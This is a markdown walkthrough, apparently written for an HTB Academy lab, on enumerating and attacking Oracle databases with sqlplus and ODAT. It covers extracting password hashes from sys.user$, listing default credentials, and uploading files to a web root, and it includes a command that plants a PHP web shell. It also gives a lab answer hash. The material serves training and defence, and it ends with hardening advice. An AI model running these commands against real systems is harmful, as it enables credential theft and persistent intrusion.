# 🛰️ Oracle Database Enumeration Guide

## Initial Setup & Connection

### Connecting to Oracle Database
```bash
# Connect to Oracle database using sqlplus
sqlplus scott/tiger@target/XE as sysdba

SQL*Plus: Release 11.2.0.2.0 Production on Thu Mar 23 21:15:48 2023
Copyright (c) 1982, 2011, Oracle. All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

### Library Error Fix
```bash
# If you encounter library errors
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

## Database Enumeration

### Basic Database Information
```sql
[!CHECK] # List all tables
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP
...SNIP...

[!CHECK] # Check user privileges
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

### Privilege Escalation
```sql
[!CHECK] # Connect as sysdba for higher privileges
SQL> connect scott/tiger@target/XE as sysdba

Connected.

[!CHECK] # Check elevated privileges
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO
...SNIP...
```

## Password Hash Extraction

### Extract User Password Hashes
```sql
[!CHECK] # Extract password hashes from sys.user$
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

## File Upload Capabilities

### Web Server Default Paths

| OS | Path |
|----|------|
| **Linux** | `/var/www/html` |
| **Windows** | `C:\inetpub\wwwroot` |

### File Upload with ODAT
```bash
[!CHECK] # Create test file
echo "Oracle File Upload Test" > testing.txt

# Upload file to target
./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Example output:
[1] (target:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the target server
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the target server like the testing.txt file
```

### Verify File Upload
```bash
# Test file upload with curl
curl -X GET http://target/testing.txt

# Expected output:
Oracle File Upload Test
```

## HTB Academy Lab Questions

### Question: Password Hash Extraction
**Task**: Enumerate the target Oracle database and submit the password hash of the user DBSNMP

**Solution**:
```bash
[!CHECK] # Step 1: Service detection
sudo nmap -p1521 -sV target --open

# Step 2: SID enumeration
sudo nmap -p1521 --script oracle-sid-brute target
# Result: SID found (e.g., XE)

# Step 3: Comprehensive enumeration with ODAT
./odat.py all -s target
# Result: Found credentials (e.g., scott/tiger)

# Step 4: Connect to database
sqlplus scott/tiger@target/XE as sysdba

# Step 5: Extract DBSNMP password hash
SQL> select name, password from sys.user$ where name = 'DBSNMP';

NAME                           PASSWORD
------------------------------ ------------------------------
DBSNMP                         E066D214D5421CCC

# Answer: E066D214D5421CCC
```

## Advanced Enumeration Techniques

### ODAT Module Overview
```bash
# Available ODAT modules:
all                   # Run all modules
tnscmd               # Communicate with TNS listener
tnspoison            # Exploit TNS poisoning attack
sidguesser           # Discover valid SIDs
snguesser            # Discover valid Service Names
passwordguesser      # Discover valid credentials
utlhttp              # Send HTTP requests or scan ports
httpuritype          # Send HTTP requests or scan ports
utltcp               # Scan ports
ctxsys               # Read files
externaltable        # Read files or execute commands
dbmsxslprocessor     # Upload files
dbmsadvisor          # Upload files
utlfile              # Download/upload/delete files
dbmsscheduler        # Execute system commands
java                 # Execute system commands
passwordstealer      # Get hashed Oracle passwords
oradbg               # Execute binaries or scripts
dbmslob              # Download files
stealremotepwds      # Steal passwords via authentication sniffing
userlikepwd          # Test username as password
smb                  # Capture SMB authentication
privesc              # Gain elevated access
cve                  # Exploit CVEs
search               # Search databases, tables, columns
unwrapper            # Unwrap PL/SQL source code
clean                # Clean traces and logs
```

## Security Assessment

### Common Vulnerabilities
1. **Default Credentials**: Standard Oracle accounts with default passwords
2. **SID Enumeration**: Brute force attacks on SID values
3. **Privilege Escalation**: Weak privilege controls
4. **File Upload**: Arbitrary file upload capabilities
5. **Password Hash Extraction**: Weak password hashing

### Enumeration Checklist
- [ ] Port scan for 1521
- [ ] Service version detection
- [ ] SID enumeration
- [ ] Credential testing
- [ ] Database connection
- [ ] Privilege escalation testing
- [ ] Password hash extraction
- [ ] File upload capabilities
- [ ] Web shell deployment

## Attack Vectors

### 1. Credential-based Access
```bash
# Common Oracle credentials
scott/tiger
system/manager
sys/sys
dbsnmp/dbsnmp
```

### 2. File Upload Exploitation
```bash
# Upload web shell
./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php
```

### 3. Database Information Extraction
```sql
[!CHECK] # Extract sensitive information
SQL> SELECT * FROM dba_users;
SQL> SELECT * FROM dba_role_privs;
SQL> SELECT * FROM dba_tab_privs;
```

## Defensive Measures

### Security Best Practices
1. **Change Default Passwords**: Replace all default Oracle passwords
2. **Restrict Network Access**: Limit TNS listener network exposure
3. **Enable Encryption**: Use SSL/TLS for all connections
4. **Regular Updates**: Apply Oracle security patches
5. **Monitor Access**: Enable audit logging
6. **Least Privilege**: Restrict database user permissions